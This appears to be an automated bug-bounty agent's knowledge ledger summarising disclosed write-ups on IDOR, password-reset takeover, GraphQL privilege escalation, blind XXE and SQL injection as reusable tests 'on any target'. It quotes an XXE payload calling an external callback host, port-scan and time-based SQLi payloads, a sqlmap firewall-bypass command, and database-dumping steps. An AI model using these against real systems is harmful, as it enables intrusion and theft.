CHAIN: any unauthenticated attacker (primitive: can request files on the target) -> the attacker adds `Makefile` to the dir-brute wordlist and finds an exposed build file (primitive: a build artifact served from the web root) -> the Makefile's contents reveal the build layout and the adjacent `Sql.DB` (escalation: the build file is an information-disclosure primitive that points at the database) -> the attacker downloads and dumps `Sql.DB` (and `.htaccess`/`web.config`) (impact: sensitive information disclosure WITH PoC — the database and server config; the report was accepted with a Dutch-government T-shirt). Per doctrine §8: preconditions = the target serves build/config artifacts from a web-accessible path; gain = the database contents and server configuration.
TRANSFERABLE TEST: on ANY target — (1) append build/config artifacts to the dir-brute wordlist (`Makefile`, `Makefile.am`, `CMakeLists.txt`, `build.gradle`, `pom.xml`, `package.json`, `composer.json`, `Sql.DB`, `*.sql`, `*.db`, `.htaccess`, `web.config`, `.env`, `*.bak`, `*.old`, `*.zip`, `*.tar.gz`); (2) request each at the web root and one level down; (3) a 200 on a `Makefile`/build file is the first link — read it for paths, targets and credentials, then request the files it references (a `Sql.DB`, a config, a backup); (4) dump the database (`sqlite3 <file> .tables` / `.dump`, or `strings`) and grep the config for credentials. Rule: **a `Makefile` in the dir-brute wordlist is a high-value target — an exposed build file names the adjacent database and config, so add build artifacts to the wordlist and follow the paths the Makefile reveals.**
DEDUPE: 0 hits across all three write targets for `Makefile` (as a wordlist entry), `Sql.DB`, `knock.py`, `romesh`, `chander.romesh`. The recorded exposed-file material covers `.env`/`.git`/`web.config`/backup files as a generic class, and the Dutch-government CSRF-ATO carrier is already recorded (gonzx, batch 129) — NONE records the `Makefile`-in-the-wordlist delta or the exposed-`Sql.DB` dump. No new §17 slot (a recon/wordlist delta on an already-covered exposed-file class).

SOURCE: https://medium.com/@yaala/trim-private-live-videos-and-access-them-a331447cc82a  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200, full body read (the description, both GraphQL requests with their `doc_id`s, and the timeline; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no Meta/GraphQL endpoint was called this pass; every quote and request shape below is verbatim from the article).
CLASS: IDOR / BOLA on a GraphQL mutation — the `video_id` of ANOTHER user's PRIVATE live video is accepted by a trim mutation, which both modifies the victim's object and mints a DERIVED object (a new trimmed video ID) that a second query resolves to a CDN link (CWE-639 / CWE-284).
CORE METHOD:
  1. THE ENTRY POINT, verbatim: `POST /api/graphql/ HTTP/2` / `Host: business.facebook.com`
  2. THE TRIM MUTATION, verbatim: `variables={"input":{"client_mutation_id":"1","actor_id":"[page_id]","video_id":"[live_victim_video_id]","trimming_params":{"trim_before_start":0,"trim_after_end":15}}}&doc_id=3859231820860792` — "Request above can trim 15 second for any private live video , and regenerate new video ID ."
  3. THE DERIVED-OBJECT READ, verbatim: `variables={"video_id":"[new_video]"}&doc_id=3561288230642336` — "The second graphql can directly access to cdn link ."
  4. THE OUTCOME, verbatim: "November 20, 2021 : Report Sent / January 19, 2022 : bounty rewarded (7500$)"
DETECTION SIGNAL: a GraphQL mutation that takes an OBJECT id (`video_id`, `post_id`, `order_id`, `document_id`, `media_id`) and performs a privileged action (trim, delete, publish, transcode, export) with NO check that the caller owns the object; a mutation that RETURNS or MINTS a derived object id (a new `video_id`, a job id, a export id); a second query that resolves that derived id to a CDN/download URL. TELL: the trim mutation succeeds on a `video_id` the caller does not own, and the returned new id resolves to a playable CDN link.
CHAIN: any authenticated attacker (primitive: a low-priv account with GraphQL access) -> the attacker calls the trim mutation with a VICTIM's private live `video_id` (primitive: the object id is not bound to the caller) -> the mutation trims the victim's video and returns a NEW video id (escalation: the attacker's action mints a derived object) -> the attacker calls the second query with the new id and receives the CDN link (impact: IDOR/BOLA — read AND modify another user's private media; $7,500 bounty). Per doctrine §8: preconditions = the attacker is authenticated and knows/guesses the victim's `video_id`; gain = the victim's private live video (trimmed + CDN access).
TRANSFERABLE TEST: on ANY GraphQL API — (1) enumerate the mutations that take an object id and perform a privileged action (`trim`, `delete`, `publish`, `transcode`, `export`, `move`, `rename`); (2) call each with a victim's object id (from a second account, a shared link, or a predictable/sequential id) and check whether it returns 200/`success` instead of an authorization error; (3) if the mutation returns a DERIVED id (a new video/job/export id), immediately call the read/query that resolves that id (a `video`, `job`, `export`, `download` query) and check whether it returns a CDN/download URL; (4) also test the derived object with a SECOND account to prove the access is not owner-bound. Rule: **a GraphQL mutation that takes an object id and mints a derived object id is an IDOR/BOLA chain — swap the victim's id into the mutation, then resolve the returned derived id to its CDN/download link.**
DEDUPE: 0 hits across all three write targets for `doc_id`, `3859231820860792`, `3561288230642336`, `trimming_params`, `trim` + `live video`, `yaala`, `business.facebook.com`. The recorded GraphQL material is about authorization on QUERIES (§17.386 GitLab `namespace` leaks a private group) and GraphQL mutation carriers for mass-assignment — NONE records a GraphQL MUTATION IDOR on a media object that mints a derived id resolving to a CDN link. New general method -> §17.411.

SOURCE: https://a-manonearth.medium.com/how-i-did-full-account-takeover-fato-using-forgot-password-link-61b8390b0731  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200, full body read (the overview, the reset-URL shape, the userId-swap test, the admin-userId oracle and the outcome; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no target endpoint was called this pass; every quote below is verbatim from the article).
CLASS: authentication bypass / account takeover — the password-reset token is NOT BOUND to the `userId`, so a token issued for the attacker's own account is valid for ANY `userId`; the forgot-password response is also a `userId` ORACLE that discloses the admin's id (CWE-287 / CWE-640 / CWE-200).
CORE METHOD:
  1. THE RESET URL SHAPE, verbatim: `https://target.com/ui/cp/requestTime?1625893867216/requestToken/118962063/userId/asasjds` — "it has three parameters, first is requestTime, second is requestToken and last is userId."
  2. THE HYPOTHESIS, verbatim: "what if I change the userId parameter to another userId and see if the requestToken of my account is valid for other userIds."
  3. THE CONFIRMATION, verbatim: "Firstly, for testing purpose I created another account and used that account's userId and guess what!!! same requestToken was being used to validate all reset password link (for every userId)."
  4. THE ADMIN-USERID ORACLE, verbatim: "So i just needed the email of admin, as once we submit the forgot request, it was showing the user id of that account in the response. So after digging for a while I got the admin email and sent a reset password request just to get the userId of the account."
  5. THE EXPLOIT, verbatim: "Now that I had the userId of admin account, I sent a password reset link to my account and changed the userId to admin's userId. Now I have full access of the admin account."
DETECTION SIGNAL: a reset/magic-link URL (or token payload) that carries a USER IDENTIFIER as a separate, editable component (`userId`, `uid`, `user_id`, `account_id`, `email`) alongside the token; a token that is a pure function of the request (a timestamp + a static/derived secret) rather than a server-side one-time record bound to the user; a forgot-password / reset-initiate RESPONSE that echoes the account's internal id (a `userId`, `uid`, `id` field, or a difference in the error/success message per account). TELL: the same token validates for a different `userId`, and the initiate response discloses the target's id.
CHAIN: any unauthenticated attacker (primitive: can request a reset for an account they control) -> the attacker reads the reset URL's three components (`requestTime`, `requestToken`, `userId`) and swaps `userId` for another account's id (primitive: the token is not bound to the user id) -> the token still validates and the attacker sets a new password for the victim (escalation: the reset is performed for the wrong user) -> to reach ADMIN, the attacker submits a forgot-password request with the admin's e-mail and reads the admin's `userId` from the response (escalation: the initiate endpoint is a userId oracle) -> the attacker resets the admin account and logs in (impact: full account takeover of the admin; the article's report was accepted). Per doctrine §8: preconditions = the attacker knows the victim's e-mail (for the userId oracle) and the reset token is not bound to the userId; gain = the victim's account, up to and including the admin account.
TRANSFERABLE TEST: on ANY password-reset / magic-link flow — (1) capture the reset link and split it into its components (a timestamp, a token, a user id); (2) request a reset for YOUR OWN account, then replay the link with the `userId`/`uid`/`account_id` component swapped for a SECOND account's id (and try a sequential/guessable id); (3) if the reset still succeeds, the token is not user-bound — an ATO primitive; (4) to find the ADMIN's id, submit the forgot-password initiate request with the admin's e-mail and inspect the RESPONSE for an echoed `userId`/`id`/different message, then swap that id in; (5) also test the reverse: fix the `userId` and brute/guess the `requestToken` to see whether the token is a weak function of the timestamp. Rule: **a reset token carried alongside an editable `userId` is an ATO primitive — swap the userId to any account, and use the forgot-password initiate response as the userId oracle that finds the admin.**
DEDUPE: 0 hits across all three write targets for `requestToken`, `requestTime`, `a-manonearth`, `FATO`, `userId` (as a reset-URL component), `reset` + `userId` swap. The recorded reset-token material is about the token LEAKING (§17.9 array type confusion, #635 predictable/eternal, §17.368 a directory API returning it, §17.289 forging it with a weak key, V-06 Host injection) — NONE records the token being VALID FOR ANY userId because the userId is a separate unbound URL component, nor the forgot-password initiate response as a userId oracle. New general method -> §17.412.

NOTE — §17 additions 2026-11-10 batch 131 (§17.409–§17.412 appended from the 6 assigned sources read ONE BY ONE in the given order; 6 entries appended to the harvest ledger + 4 §17 slots). NEW: (1) techiepedia/Jess — the PASSWORD-RESET TEMP TOKEN is accepted as a BEARER on the app's OTHER API endpoints and carries ADMIN authorization, so replaying it from Burp history unlocks all data/functions -> §17.409. (2) philippeharewood / Instagram — a FIRST-PARTY APPLICATION ACCESS TOKEN (`appID|secret`) is embedded in a Base64 blob inside a CLIENT-SIDE Bloks bundle; decode it, replay it as `Authorization: OAuth <appID>|<secret>`, and confirm with a non-destructive `graph.facebook.com/app/roles` call -> app admin, $30k -> §17.410. (3) yaala / Meta — a GraphQL trim MUTATION takes another user's private live `video_id`, mints a NEW video id, and a second query resolves that id to a CDN link -> IDOR/BOLA, $7,500 -> §17.411. (4) a-manonearth — the reset token is NOT bound to the `userId` URL component, so swapping `userId` resets any account, and the forgot-password initiate response is a `userId` oracle that finds the admin -> FATO -> §17.412. CARRIER DELTAS (no §17 slot): remonsec / SIDN — a 403 on a bare directory (`/pipermail`) becomes a 200 directory index with a trailing slash (`/pipermail/`), exposing a private mailing-list archive; Romesh chander / Dutch government — add `Makefile` to the dir-brute wordlist, read the exposed build file, and download/dump the adjacent `Sql.DB` (plus `.htaccess`/`web.config`). 0 invalid, 0 fabricated. Full per-source route/honesty records are in the harvest ledger `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-10.md`.

SOURCE: https://infosecwriteups.com/how-we-was-able-to-takeover-whole-organization-via-privilege-escalation-4f74b31a84a6  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200, full body read (the role docs, the GraphQL invite request, the Database-Administrator-cookie replay, the static role ids and the outcome; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no target endpoint was called this pass; every quote below is verbatim from the article). HONESTY: HackerOne closed the report as N/A and later as a duplicate; the METHOD is what transfers, and it is recorded here as a role-authorization gap, not as a validated finding.
CLASS: broken access control / vertical privilege escalation — a LOWER-PRIVILEGED role can invoke an ADMIN-ONLY GraphQL mutation (invite a user with full permissions / edit user permissions), because the mutation's authorization is keyed on a STATIC, client-supplied role id rather than on the caller's actual server-side role (CWE-863 / CWE-269 / CWE-284).
CORE METHOD:
  1. THE RECON, verbatim: "We picked a target with many roles so we can play around with Access Control Misconfigurations, which we did the target was allowing us to create an organization and give permissions for each user"
  2. THE ROLE, verbatim: "My brother found a role called `Database Administrator`" — and the docs say it "cannot change users permissions or invite user".
  3. THE HYPOTHESIS, verbatim: "having a look at the requests being sent we found that it contains a `Graphql` query so why cannot Database administrator execute these queries?"
  4. THE BYPASS, verbatim: "we used the same request with `Database Administrator ` user cookie we noticed that the request sent successfully!"
  5. THE STATIC ROLE IDS, verbatim: "Note that the `roles ` in the request are static ids so we can get them by creating a temp organization and intercept the request."
  6. THE CHAIN, verbatim: "1. login as `Database Administrator` 2. create temp account 3. copy the above request and send invitation to the created account 4. accept the invitation from the new account and you will be a full admin" — and "the issue is also applicable on the edit user permissions request so we got 2 ways to do it".
DETECTION SIGNAL: a product with many roles where a LOWER role's cookie can send an ADMIN-ONLY GraphQL mutation (invite user / edit permissions / manage members) and get a success response; a GraphQL mutation whose authorization depends on a STATIC, enumerable role id in the request body/variables rather than the caller's server-side role; role ids that are identical across organizations (harvestable from a temp org). TELL: the admin-only mutation returns success with the lower role's cookie, and the role id is a static value you can read from a temp org.
CHAIN: any authenticated low-privileged user (primitive: a `Database Administrator`-class role) -> the attacker replays the admin-only invite-user GraphQL mutation with the lower role's cookie (primitive: the mutation's role check is keyed on a static client-supplied role id) -> the request succeeds and mints a user with FULL ADMIN permissions (escalation: vertical privilege escalation to full admin) -> the attacker accepts the invite from the temp account and owns the organization (impact: full organization takeover; the same gap applies to the edit-user-permissions mutation, giving two paths). Per doctrine §8: preconditions = an authenticated account holding a lower-privileged role, and a target whose GraphQL mutations authorize on a static/enumerable role id; gain = full admin over the organization.
TRANSFERABLE TEST: on ANY multi-role product with a GraphQL API — (1) enumerate the roles and read the vendor docs for the LOWER roles (the ones that "cannot invite/edit permissions"); (2) create a temp organization to harvest the STATIC role ids from the invite/edit-permissions request; (3) replay the admin-only mutation (invite user, edit permissions, add member, assign role) with the LOWER role's cookie and the harvested role id; (4) a success response / created object = the role check is keyed on the supplied id, not the caller's role; (5) accept the invite from the temp account and confirm you are full admin. Rule: **a lower role's cookie plus a static, client-supplied role id is a vertical-privilege-escalation primitive — replay every admin-only GraphQL mutation with it and check whether the role check trusts the request's role value.**
DEDUPE: 0 hits across all three write targets for `Database Administrator`, `static ids`, `boomneroli`, `n3r0li`, `invite` + `graphql` + `role`. The recorded GraphQL material is about authorization on QUERIES (§17.386), a GraphQL MUTATION IDOR on a media object that mints a derived id (§17.411), and invite-collaborator mass assignment (§17.42) — NONE records a LOWER ROLE invoking an ADMIN-ONLY GraphQL mutation because the role id is a static client-supplied value. New general method -> §17.413.

SOURCE: https://coffeejunkie.me/Blind-XXE-Port-Scanning/  2026-11-10
ROUTE: the live domain no longer resolves — `getent hosts coffeejunkie.me` empty, `curl` -> "Could not resolve host", `web_extract` -> "Blocked: URL targets a private or internal network address", `r.jina.ai` -> "Domain 'coffeejunkie.me' could not be resolved". Route that worked: the WAYBACK copy `http://web.archive.org/web/20220121175055/https://coffeejunkie.me/Blind-XXE-Port-Scanning/` -> HTTP 200, full body read (the recon, the `WebDocXML` parameter, the blind-XXE payload, the timing thresholds and the outcome).
STATUS: UNVERIFIED (not reproduced — no target endpoint was called this pass; every quote and payload below is verbatim from the Wayback copy of the article).
CLASS: blind XXE (out-of-band) in a FORM parameter that accepts raw XML, escalated to a TIME-BASED INTERNAL PORT SCAN via SSRF (CWE-611 / CWE-918 / CWE-200).
CORE METHOD:
  1. THE RECON, verbatim: "When mapping the web application, there was a form to submit a different kind of ideas with several fields to fill information." — and the interesting parameter: "an interesting parameter that caught my attention due to its name which was `WebDocXML`, and as its name says it, it was taking XML data from the form and parsing it in the server side."
  2. THE REQUEST, verbatim: "a `POST` request was sent with content type `application/x-www-form-urlencoded`" — the XML goes in the `WebDocXML` form field.
  3. THE BLIND-XXE CONFIRMATION, verbatim: "a common blind XXE payload was used with the purpose to receive an HTTP request in my VPS where, fortunately, the vulnerability proved to exist as I was able to receive an HTTP request from the target's IP. The following blind XXE payload was used." — `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://external-server.ca"> %xxe; ]>`
  4. THE ESCALATION TO PORT SCAN, verbatim: "Internal port scanning was possible by using the XXE payload mentioned before and sending a different kind of HTTP requests to possible web services running over HTTP within the server. Just to confirm the flaw, this was a **time-based port scanning** meaning that: If the port is open, the *response time will take less than 1000 mills*. If the port is filtered or closed, the *response will take more than 2000 mills*"
  5. THE PAYLOADS, verbatim: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://localhost:80" > %xxe; ] >` (closed, >2000 ms) and `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://localhost:443"> %xxe; ] >` (open, <1000 ms).
  6. THE OUTCOME, verbatim: "After proving that port scanning was possible via time based method, Synack accepted and rewarded the vulnerability with 10% of the value as the endpoint was reported before, with a `5.8` CVSS score."
DETECTION SIGNAL: a form/request parameter whose NAME advertises a data type (`WebDocXML`, `*XML`, `*SOAP`, `*SVG`, `*HTML`, `*JSON`, `*Doc`) — a server-side parser is behind it; a parameter that accepts a document/XML body and returns only a generic 200 + a redirect script (a BLIND response); an outbound HTTP hit to your listener on submit (OOB XXE); a response whose TIME differs by port when the entity points at `http://localhost:<port>`. TELL: the parameter name says XML, the response is blind, your listener is hit, and `localhost:443` returns faster than `localhost:80`.
CHAIN: anyone who can submit the form (primitive: the `WebDocXML` field is reachable) -> the attacker injects a parameter entity that fetches an external DTD/URL (primitive: DTD/entity resolution enabled) -> the server makes an outbound HTTP request to the attacker's host (escalation: blind XXE confirmed by OOB callback) -> the attacker re-points the entity at `http://localhost:<port>` and measures response time (escalation: time-based internal port scan, open <1000 ms / closed >2000 ms) -> internal service fingerprinting and further SSRF/XXE chains (impact: internal reach via XXE-driven SSRF; Synack accepted, CVSS 5.8). Per doctrine §8: preconditions = a reachable form field that parses attacker XML and no egress restriction on the entity fetch; gain = internal port scan / internal service reach.
TRANSFERABLE TEST: on ANY form/API field whose name or value is XML/SOAP/SVG/HTML — (1) submit `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<your-host>/x"> %xxe; ]>` (or the two-stage external-DTD variant) and watch your listener; (2) an outbound hit = blind XXE; (3) re-point the entity at `http://localhost:<port>` (and `127.0.0.1`, `169.254.169.254`, RFC1918 hosts) and measure the response time — <1000 ms = open, >2000 ms = closed/filtered; (4) sweep a port list and fingerprint the open services. Rule: **a parameter named for a document type is a parser sink — confirm blind XXE with an OOB callback, then convert it into a time-based internal port scanner by pointing the entity at `localhost:<port>` and timing the response.**
DEDUPE: 0 hits across all three write targets for `WebDocXML`, `coffeejunkie`, `caffeinevulns`, `time-based port`, `XXE` + `port scan`, `localhost:<port>` + XXE. The recorded XXE material is §17.204 (an OOXML package part with an FTP-exfil DTD), §17.295 (an SVG rasterizer's XInclude/entity SSRF) and #315837 (an autodiscover XML parser with a file-existence oracle) — NONE records a raw-XML FORM FIELD (`WebDocXML`) as the sink, nor XXE escalated to a TIME-BASED internal port scan. New general method -> §17.414.

SOURCE: https://medium.com/@jawadmahdi/how-i-found-blind-sql-injection-just-by-browsing-and-getting-a-unique-url-ed87fa1f35ed  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200, full body read (the Burp-history recon, the unique POST request, the XOR payload, the sqlmap command and the outcome; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no target endpoint was called this pass; every quote and command below is verbatim from the article).
CLASS: blind time-based SQL injection — discovered by BROWSING with a proxy and inspecting HTTP history for a UNIQUE POST request, then extracted past a firewall with a sqlmap tamper combo (CWE-89).
CORE METHOD:
  1. THE RECON, verbatim: "I manually browsed all the URLS and they were getting collected in BURPSUITE HTTP HISTORY. I found a unique POST request which weren't normally available. So I suddenly remembered that sometimes manually browsing can get you unique URLS if you use a PROXY like Burpsuite, I read it in WEB APPLICATION HACKER HANDBOOK."
  2. THE PAYLOAD, verbatim: "I found many parameters in that POST request and I started checking those parameters with this payload `'XOR(if(now()=sysdate(),sleep(5\*1),0))OR'` — And to my surprise, It worked and slept for 5 seconds."
  3. THE SQLMAP BLOCK, verbatim: "I immediately copied the request and used SQLMAP on that. I used different SQLMAP command but a firewall was blocking me from fetching the current database."
  4. THE BYPASS, verbatim: `sqlmap.py -r request.txt -p "value" -v 3 — level=5 — risk=3 — time-sec=15 — tamper=between — current-db — no-cast` — "and guess what? I was able to retrieve the current database name."
DETECTION SIGNAL: a POST request in the proxy history that is NOT linked from any page/button (a "unique" request only reachable by browsing a specific flow); a parameter that sleeps N seconds on a time-based payload; a sqlmap run that confirms the injection but FAILS to fetch the current database (a WAF/firewall blocking the extraction, not the injection). TELL: the time-based payload sleeps, and sqlmap's `--current-db` returns nothing until the tamper is added.
CHAIN: any authenticated or unauthenticated user (primitive: can submit the form behind the unique POST) -> the attacker browses the app through a proxy and finds a POST request that is not normally reachable (primitive: a hidden/unique request) -> the attacker tests each parameter with a quote-balanced time oracle and the response sleeps 5 s (escalation: blind time-based SQLi confirmed) -> the attacker runs sqlmap with `--tamper=between --no-cast --current-db` to get past the firewall (escalation: extraction unblocked) -> the current database name is retrieved (impact: SQLi with data impact; the article's report was accepted). Per doctrine §8: preconditions = a reachable request with a parameter concatenated into SQL, and a WAF that blocks sqlmap's default extraction; gain = the current database name (the first step of full data extraction).
TRANSFERABLE TEST: on ANY target — (1) browse the whole app through Burp/http history and list every POST request that has no visible link/button (a "unique" request); (2) test each of its parameters with a quote-balanced time oracle (`'XOR(if(now()=sysdate(),sleep(5*1),0))OR'`, `'or(if(now()=sysdate(),sleep(5),0))or'`) and time the response; (3) if sqlmap confirms the injection but `--current-db` is blocked, re-run with `--tamper=between --no-cast --current-db --level=5 --risk=3 --time-sec=15`; (4) a returned database name = the WAF bypass worked. Rule: **when sqlmap is blocked by a firewall from fetching the current database, add `--tamper=between --no-cast` — and find the injection point by browsing with a proxy, because the vulnerable request is often a unique POST that no page links to.**
DEDUPE: 0 hits across all three write targets for `tamper=between`, `no-cast`, `jawadmahdi`, `unique POST`, `Burp` + `history` (as a SQLi discovery method). Pre-existing hit REVIEWED and NOT re-recorded as this method: the `'xor(if(now()=sysdate(),sleep(10),0))or'` time oracle is already recorded (innogames, URL-PATH injection, ledger ~line 322) — this entry is admitted only for the DISCOVERY heuristic (a unique POST in proxy history) and the sqlmap WAF-bypass combo (`--tamper=between --no-cast --current-db`), both new. The recorded sqlmap material (the Grab `admin-ajax.php` boolean-blind entry with `--tamper commalesslimit` + `--eval`, ledger ~line 4204) is a different tamper for a different WAF behaviour. New general method -> §17.415.

NOTE — §17 additions 2026-11-10 batch 132 (§17.413–§17.415 appended from the 6 assigned sources read ONE BY ONE in the given order; 3 entries appended to the harvest ledger + 3 §17 slots). NEW: (1) boomneroli / n3r0li — a LOWER role (`Database Administrator`) can invoke an ADMIN-ONLY GraphQL mutation (invite user / edit permissions) because the role check trusts a STATIC, client-supplied role id harvested from a temp org -> vertical privesc to full admin -> §17.413. (2) coffeejunkie / caffeinevulns — a raw-XML FORM FIELD (`WebDocXML`) is a blind-XXE sink; confirm with an OOB callback, then point the entity at `http://localhost:<port>` and TIME the response (open <1000 ms, closed >2000 ms) for an internal port scan -> §17.414. (3) jawadmahdi — find the injection point by browsing with a proxy and picking the UNIQUE POST request out of Burp history, then defeat a firewall that blocks sqlmap's `--current-db` with `--tamper=between --no-cast` -> §17.415. VALID-BUT-DUPLICATE (read, nothing new, no entry): yasshk / "Blind SSRF in URL Validator" — the attacker-hosted redirector (ngrok + PHP `header("Location: http://127.0.0.1:<port>")`) that defeats the internal-address filter and the timing-based port scan on a URL-validator endpoint are BOTH already recorded (the redirect bypass "a `302 → internal` redirect served from your own host to defeat naive allowlists" and "sweep hosts/ports by timing", ledger ~line 3365; the validator/image-check carrier at ~line 10552). INVALID FOR TECHNIQUE (real and readable, but no concrete method / below the bar, no entry): philippeharewood / CrowdTangle Deletion Framework API — a root GraphQL query exposes internal CrowdTangle API calls (`CrowdTangleDeletionResult` with `id`/`parent_id`/`system`) to regular users, but the page gives no request shape, parameter or PoC, and Facebook's own wording is "this wasn't enough to pass the bar for a bounty" (rewarded only as a hardening opportunity); philippeharewood / Facebook gaming community invites — the page states only that `community_manager_invite_profiles` is disclosed, with no request shape or PoC, and the credited previous-work page (read via `web_extract`) is equally thin (a rejected invitee stays on the pending list; Facebook closed it as informative) — a P4/P5-class privacy primitive per doctrine §2(b)/§6. 6 sources read, 0 fabricated. Full per-source route/honesty records are in the harvest ledger `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-10.md`.

SOURCE: https://bxmbn.medium.com/how-i-prevented-a-mass-data-breach-15-000-bounty-bxmbn-1096e6400e3d  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200, full body read (the Google-dork recon, the 403 OrderView, the Wayback MailOid endpoint, the Set-Cookie harvest, the cross-order replay and the impact; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no target endpoint was called this pass; every quote below is verbatim from the article).
CLASS: broken access control / IDOR — a blank 200 endpoint mints the order's authentication cookies, and the `mailId` parameter is a universal key for every order; replay the cookies on the order-view endpoint to read any order (CWE-639 / CWE-284 / CWE-522).
CORE METHOD:
  1. THE RECON, verbatim: "my approach mirrored what I typically do when testing such extensive programs — searching for old endpoints using specific Google Dorks." -> a subdomain dedicated to storing user orders.
  2. THE ORDER VIEW, verbatim: `https://orders.privateprogram.com/webapp/wcs/stores/servlet/OrderView?orderId=002233893` — "I visited it, but of course, I got a forbidden error."
  3. THE WAYBACK ENDPOINT, verbatim: "Using the Wayback Machine. I found this new interesting endpoint: `https://orders.privateprogram.com/webapp/wcs/stores/servlet/MailOid?orderId=003163553&mailId=a1c156c4–6c4a-4bf9–9a17–2c5bvcdf6ec1`" — "I requested it and received a '200 Ok' response, but it returned a blank page."
  4. THE COOKIE MINT, verbatim: "Upon inspecting the response, I noticed the server was setting cookies each time I sent a request." — `Set-Cookie: WC_PERSISTENT*=*************************` / `Set-Cookie: WC_AUTHENTICATION_*=***********************` / `Set-Cookie: WC_USERACTIVITY_*=*************************` — "If you are familiar with these cookies, you know these are actually authentication cookies."
  5. THE REPLAY, verbatim: "So, I tried to see order 003163553 with those cookies ... And it worked! I gained access to that order."
  6. THE UNIVERSAL KEY, verbatim: "While the mailId apparently tries to act as a security key, it works as the security key for all orders and will grant you access to any order as long as it is valid and present when requesting: `https://orders.privateprogram.com/webapp/wcs/stores/servlet/MailOid?orderId=<anyorder>&mailId=a1c156c4–6c4a-4bf9–9a17–2c5bvcdf6ec1`"
  7. THE IMPACT, verbatim: "This vulnerability could have allowed an attacker to access anyone's order, comprising sensitive details such as Payment Method, Contract PDF, Billing & Shipping Address, Email Address, Phone Number, First and Last Names, potentially exposing information of 3 Million People." — "Max Critical Bounty + Bonus Awarded → July 24th 2023" ($15,000).
DETECTION SIGNAL: an endpoint whose response body is blank/empty but whose `Set-Cookie` headers mint authentication/session cookies; an order/document/invoice id in the URL with a second id parameter (`mailId`, `token`, `key`, `uuid`) that is accepted for any first id; an endpoint discoverable only via Wayback/Google dorks (not linked from the app). TELL: the blank endpoint sets auth cookies and those cookies unlock a DIFFERENT order id.
CHAIN: any unauthenticated attacker (primitive: can request the blank endpoint) -> Google dorks/Wayback find a blank 200 endpoint (`MailOid`) that sets `WC_AUTHENTICATION_`/`WC_PERSISTENT`/`WC_USERACTIVITY` cookies (primitive: a cookie-minting oracle) -> the `mailId` parameter is a universal key (any order id + a valid mailId mints that order's cookies) -> replay the cookies on `OrderView?orderId=<any>` (escalation: the order-view endpoint trusts the minted cookies) -> read any order's PII/payment/contract data (impact: broken access control / IDOR, mass PII, 3M users; $15,000 critical bounty). Per doctrine §8: preconditions = the attacker can reach the blank endpoint and obtain a valid `mailId` (from a dork/Wayback or their own order); gain = any order's payment method, contract PDF, addresses, e-mail, phone and names.
TRANSFERABLE TEST: on any order/invoice/document flow — (1) find endpoints via Wayback + Google dorks (`site:orders.* "orderId"`, `"MailOid"`, `"orderId="`, `"invoiceId="`); (2) for every blank-200 or "not found" endpoint, inspect `Set-Cookie` and collect any auth/session cookies; (3) replay those cookies against the object-view endpoint with a DIFFERENT object id (from dorking or sequential); (4) a 200 with another order's data = IDOR; (5) test whether the second id param (`mailId`/`token`/`key`) is a universal key by keeping it fixed while varying the object id. Rule: **a blank endpoint that sets authentication cookies is a cookie-minting oracle — harvest the cookies, replay them against the object-view endpoint with any object id, and check whether the companion id parameter is a universal key.**
DEDUPE: 0 hits across all three write targets for `MailOid`, `orderId`, `WC_AUTHENTICATION`, `WC_PERSISTENT`, `cookie-minting`, `blank endpoint` + `Set-Cookie`. The recorded order/IDOR material is about `/orders/{orderId}` path traversal and direct IDOR; none records a blank endpoint that MINTS the object's auth cookies nor a universal companion key. New general method -> §17.416.

SOURCE: https://hackerone.com/reports/4152553  2026-11-10
ROUTE: `web_extract` on the live HackerOne report page -> HTTP 200, full report body read (summary, description, PoC steps; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no WordPress instance was stood up this pass; every quote below is verbatim from the report).
CLASS: sensitive information disclosure WITH PoC / broken access control — a WordPress helper (`acf_get_posts()`) queries with `post_status => 'any'` and never checks `read_post`, so reference fields (Relationship/Post Object/Page Link) resolve private, draft, pending and password-protected posts for unauthenticated callers (CWE-200 / CWE-862 / CWE-284).
CORE METHOD:
  1. THE CORE BOUNDARY, verbatim: "For user 0, core drops non-public posts from `WP_Query::$posts` (`wp-includes/class-wp-query.php:3497-3523`) and answers `404`; REST answers `401 rest_forbidden`; a password-protected post renders the password form instead of the body."
  2. THE SINK, verbatim: "`acf_get_posts()` (`includes/api/api-helpers.php:1168`) sets `post_status => 'any'` (`:1179`) and calls `get_posts()` (`:1211`) with no `current_user_can( 'read_post' )`, no `is_post_publicly_viewable()` and no `post_password_required()`." — "In WordPress 7.1.3 `draft`, `pending` and `private` are not `exclude_from_search`, so `'any'` returns them."
  3. THE CONTRAST, verbatim: "PoC step 2 shows `WP_Query( post_status='publish' )` = 0 results against `acf_get_posts()` = 1."
  4. THE DELIVERY, verbatim: "The vulnerability is the read. A reference written by WP-CLI or an editor leaks identically: PoC step 7 writes the meta directly, with no form, and the anonymous page still renders `Private: ` and returns the private body through `get_field()`." — "The signed form grant authorises field keys for saving ... and carries no statement about read permission for referenced posts."
  5. THE PATCH GAP, verbatim: "6.9.3 added `$enforce_read_permissions` to `acf_get_grouped_posts()` ... and wired it to the three AJAX call sites only ... 6.9.6 added the REST gate ... 6.9.7 added `expose_reference_target()` and `strip_post_passwords()` for block bindings ... The render path (`class-acf-field-relationship.php:532`), `format_value()` ... and the JSON-LD formatter ... still call the unguarded helper."
DETECTION SIGNAL: a WordPress site with Advanced Custom Fields / Secure Custom Fields; a reference field (Relationship, Post Object, Page Link) whose value is a post id; an AJAX/REST/block-binding/JSON-LD path that resolves the field. TELL: `acf_get_posts()` returns a private/draft/password-protected post where core returns 404/401, and the response includes the plaintext `post_password`.
